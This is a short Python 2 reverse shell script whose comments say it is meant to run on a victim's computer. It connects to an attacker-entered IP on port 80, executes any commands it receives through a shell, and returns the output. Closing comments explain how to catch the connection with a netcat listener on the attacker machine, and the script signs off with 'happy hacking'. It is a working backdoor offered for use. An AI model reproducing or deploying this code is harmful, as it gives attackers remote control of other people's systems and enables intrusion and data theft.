
# python script for invoking the reverse shell of the victims system main operating system 

# 789sk.gupta@gmail.com 

# This is to be run on the victims computer 

import socket 
import os
 
import subprocess # processing of the commands


# hostip = "127.0.0.1" # attacker's computer ip (Taken local system's ip for testing can be modified as required)

hostip = raw_input("enter as the ip address of the attacking machine")

port = 80

#password = 1234



def Login():
	global ob
	#ob.send("Please Login: ")
	#rec = ob.recv(1024) # data entered into bytes 
	
	#if rec.strip() != password:
		#Login()
		
	#else:
	ob.send("Connected to the system shell #")	
	Shell()
		
		
		
# function to execute the shell commands 

#happy hacking
def Shell():		
	while True:
		data = ob.recv(1024)
		
		if data.strip() == ":kill" :
			break
			
		
		process = subprocess.Popen(data, shell=True , stdout=subprocess.PIPE , stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = process.stdout.read() + process.stderr.read()
		
		ob.send(output)
		ob.send("#>")
		
		
		
# the main driver code 

ob = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP SOCKET INITIALISATION
ob.connect((hostip,port))
Login()		

# to test the backdoor run this python script on the victim's machine after executing the netcat listner on your(as attacker) machine 
# first start a listner by command nc -lvp 80 on attacker machine 
# then run this script on the victims's computer
# you wil get a shell!!!:>>

#HAPPY HACKING 
	
	
